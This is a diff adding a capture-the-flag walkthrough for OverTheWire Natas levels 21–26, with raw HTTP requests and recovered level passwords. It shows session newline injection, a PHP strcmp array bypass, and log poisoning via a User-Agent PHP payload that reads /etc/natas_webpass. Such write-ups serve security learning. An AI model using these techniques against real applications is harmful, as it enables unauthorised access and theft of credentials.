@@ -478,3 +478,123 @@ while not found and index <= 999:                                               
         index += 1                                                                                 |
 ---------------------------------------------------------------------------------------------------+
 password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+
+Natas21:
+In myread() we can see that session file's content is split by using \n (newline) as separator character.
+
+$_SESSION = array();
+foreach(explode("\n", $data) as $line) {
+	debug("Read [$line]");
+	...
+}
+
+Furthermore, to fill the $_SESSION array, each line is expected to be in the form key value
+
+$_SESSION = array();
+foreach(explode("\n", $data) as $line) {
+	...
+	$parts = explode(" ", $line, 2);
+	if($parts[0] != "")
+		$_SESSION[$parts[0]] = $parts[1];
+}
+
+To get authenticated as admin, page checks if session contains the admin key and if its value in 1.
+
+When parameter called name is posted, a new session is initialised and value of name is stored on it (without being sanitised!!!).
+
+we then put on Burp:
+POST /index.php?debug HTTP/1.1
+name=foo%0Aadmin 1
+
+this will create a PHPSESSID and save to the data file
+--------+
+name foo|
+admin 1 |
+--------+
+
+next we make a GET request with this PHPSESSID returned to us
+GET /index.php HTTP/1.1
+Cookie: PHPSESSID=9seaiehjirpnmf3077g756tniu
+
+You are an admin. The credentials for the next level are:
+Username: natas21
+Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+
+Natas22:
+This one was very easy.
+To get authenticated as admin, page checks if $_SESSION contains the "admin" key and if its value in 1.
+But natas21.experimenter lets us generate a PHPSESSID (delete the cookies first) that contains the keys and values of align, fontsize and bgcolor
+on firefox, we inspect the fiels and just change name="bgcolor" to name="admin" and value="yellow" to value="1"
+this will generate a PHPSESSID. we grab it and go to http://natas21.natas.labs.overthewire.org/index.php
+
+password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+
+
+Natas23:
+Very easy also.
+The website print credentials if $_SESSION["admin"] = 1 and $_GET("revelio") exists.
+Just make the POST request on Burp
+----------------------------------------------------------------------------------------------------------------
+POST /index.php?revelio HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyMjo5MWF3Vk05b0RpVUdtMzNKZHpNN1JWTEJTOGJ6OW4wcw==
+Connection: close
+Cookie: PHPSESSID=mbqg9njmbh922jhnm6262mpmn6
+Upgrade-Insecure-Requests: 1
+Content-Length: 7
+
+admin=1
+----------------------------------------------------------------------------------------------------------------
+
+password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
+
+
+Natas24:
+Just pust
+password=11iloveyou
+because it needs to contain the string "iloveyou" and be greater than "10" in alphabetic order I guess
+password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+
+
+Natas25:
+Look at Google on how to exploit strcmp on PHP
+https://rst.hashnode.dev/bypassing-php-strcmp
+If we submit an empty array passwd[]=something PHP translates GET variables like this to an empty array which causes strcmp() to barf: strcmp(array(), "token") -> NULL which will return 0
+
+we just go
+http://natas24.natas.labs.overthewire.org/index.php?passwd[]=ash
+password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+
+
+Natas26:
+
+The things is use "....//" because that will be filtered to "../"
+we can include the log file with ?lang=....//logs/natas25_8vm1kg9qusfinr4a08agkjeeu7.log
+Now, because the log file has
+$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+we use the header User-Agent to inject PHP code like
+User-Agent: <?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
+
+Burp Request
+--------------------------------------------------------------------------------------------------------
+GET /index.php?lang=....//logs/natas25_8vm1kg9qusfinr4a08agkjeeu7.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyNTpPOVFEOURaQkRxMVlwc3dpVE01b3FNRGFPdHVadEFjeA==
+Connection: close
+Cookie: PHPSESSID=8vm1kg9qusfinr4a08agkjeeu7
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------------------------------------------------------
+
+password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
